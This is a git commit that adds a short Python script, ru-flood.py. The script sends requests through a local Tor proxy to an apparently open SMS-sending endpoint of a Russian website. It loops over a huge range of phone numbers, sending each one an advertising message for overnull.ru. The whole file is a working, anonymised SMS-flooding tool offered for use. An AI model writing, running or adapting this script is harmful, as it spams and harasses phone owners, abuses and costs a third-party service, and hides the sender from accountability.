146523a82e69be0b3707c4381d61697dd92cc699
Security High <45529919+securityhigh@users.noreply.github.com>
2020-11-23 20:33:07 +0700

    Add files via upload

---
+++ ru-flood.py
@@ -0,0 +1,24 @@
+#!/usr/bin/python3
+
+import requests
+from random import random
+from time import sleep
+from sys import argv
+
+def get_tor_session():
+    session = requests.session()
+    session.proxies = {'http':  'socks5://127.0.0.1:9050',
+                       'https': 'socks5://127.0.0.1:9050'}
+    return session
+
+session = get_tor_session()
+
+def flood(phone):
+    text = "информационная безопасность overnull.ru\n\n"
+    url = f"https://elis.ru/api/sms/sendSms/{text}/{phone}/"
+
+    response = session.post(url=url, headers={"X-Requested-With": "XMLHttpRequest"})
+    print(phone + ":" + response.content.decode())
+
+for i in range(int(argv[1]), 80000000000):
+    flood(str(i))
